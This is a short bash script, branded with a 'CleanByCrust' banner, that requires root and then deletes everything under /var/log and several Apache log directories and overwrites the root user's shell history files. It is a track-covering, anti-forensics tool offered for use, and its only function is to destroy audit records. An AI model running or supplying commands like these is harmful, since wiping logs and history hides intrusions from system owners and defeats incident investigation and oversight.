#!/bin/bash
2>/dev/null
SYSTEM_USER_NAME=$(id -un)
if [[ "${SYSTEM_USER_NAME}" != 'root'  ]]
then
    echo 'You are not running the script as root!'
    exit 1
fi
echo "
\ \      / /__| | ___ ___  _ __ ___   ___  | |_ ___  
 \ \ /\ / / _ \ |/ __/ _ \|     _ \ / _ \ | __/ _ \ 
  \ V  V /  __/ | (_| (_) | | | | | |  __/ | || (_)|
   \_/\_/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/                                                
  ____ _                  ____         ____               _   _ 
 / ___| | ___  __ _ _ __ | __ ) _   _ / ___|_ __ __ _ ___| |_| |
| |   | |/ _ \/ _  |  _ \|  _ \| | | | |   | '__/ _  / __| __| |
| |___| |  __/ (_| | | | | |_) | |_| | |___| | | (_| \__ \ |_|_|
 \____|_|\___|\__,_|_| |_|____/ \__, |\____|_|  \__,_|___/\__(_)
                                |___/ "


echo -e "Cleaning log files,this can take up a bit.\n"

rm -rf /var/log/*
echo -e "[+]Removing everything in /var/log...\n"

rm -rf /var/apache/logs
echo -e "[+]Removing everything in /var/apache/logs...\n"

rm -rf /var/apache/log
echo -e "[+]Removing everything in /var/apache/log...\n"

rm -rf /usr/local/apache/log
echo -e "[+]Removing everything in /usr/local/apache/log...\n"

rm -rf /usr/local/apache/logs
echo -e "[+]Removing everything in /usr/local/apache/logs...\n"

echo Cleaned! > /root/.history
echo -e "[+]Removing everything in /root/.history...\n" 

echo Cleaned! > /root/*_history
echo -e "[+]Removing everything in /root/*_history...\n"

echo "Donee! Everywhere looks better now!"

exit 1